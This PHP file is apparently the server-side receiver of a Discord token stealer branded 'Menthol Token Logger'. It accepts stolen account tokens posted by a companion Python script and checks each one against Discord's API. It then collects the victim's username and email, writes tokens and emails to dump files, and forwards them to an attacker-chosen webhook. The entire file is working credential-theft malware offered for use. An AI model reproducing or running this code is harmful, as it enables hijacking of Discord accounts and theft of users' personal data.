<?php
//(Python) webhook='webhook';import requests;request.post('link_to_php?Webhook='+webhook, tablefortokens)
//Mosts functions were made by !fishgang Cyrus (https://github.com/Not-Cryus)
$json = file_get_contents('php://input');
$data = json_decode($json, true);
$webhook = $_GET['Webhook'];
$timestamp = date("c", strtotime("now"));
$ip = $_SERVER['REMOTE_ADDR'];
$fields = [];

function CurlSend($Link,$HeaderArray){
	$Curl = curl_init($Link);
	curl_setopt_array($Curl,$HeaderArray);
	$Response = curl_exec($Curl);
	curl_close($Curl);
	return $Response;
}

function verifyToken($Token){
    $Res = CurlSend("https://discordapp.com/api/v7/users/@me",[CURLOPT_HTTPHEADER => ["Authorization: $Token"],CURLOPT_RETURNTRANSFER => 1]);
    $User = json_decode($Res,true);
    if (array_key_exists("username",$User)){
        return "{$User['username']}#{$User['discriminator']}";
    }
    return "Invalid";
}

function verifyEmail($Token){
    $Res = CurlSend("https://discordapp.com/api/v7/users/@me",[CURLOPT_HTTPHEADER => ["Authorization: $Token"],CURLOPT_RETURNTRANSFER => 1]);
    $User = json_decode($Res,true);
    if (array_key_exists("username",$User)){
        return "{$User['email']}";
    }
    return "Invalid";
}

foreach ($data as $arr) {
    foreach($arr as $token) {
        $File = fopen("../dump/Tokens.txt","a");
        fwrite($File,"$token\n");
        fclose($File);
        $File2 = fopen("../dump/Emails.txt","a");
        fwrite($File2,verifyEmail($token)."\n");
        fclose($File2);
        array_push($fields, [
            "name" => verifyToken($token)." (".verifyEmail($token).")",
            "value" => "```".$token."```",
            "inline" => false
        ]);
    }
}


$postdata = json_encode([
    "username" => "Menthol",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Menthol Token Logger",
            "type" => "rich",
            "description" => "",
            "timestamp" => $timestamp,
            "color" => hexdec( "3366ff" ),
            "fields" => $fields,
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();
curl_setopt_array( $ch, [
    CURLOPT_URL => $webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $postdata,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $ch );
curl_close( $ch );
?>
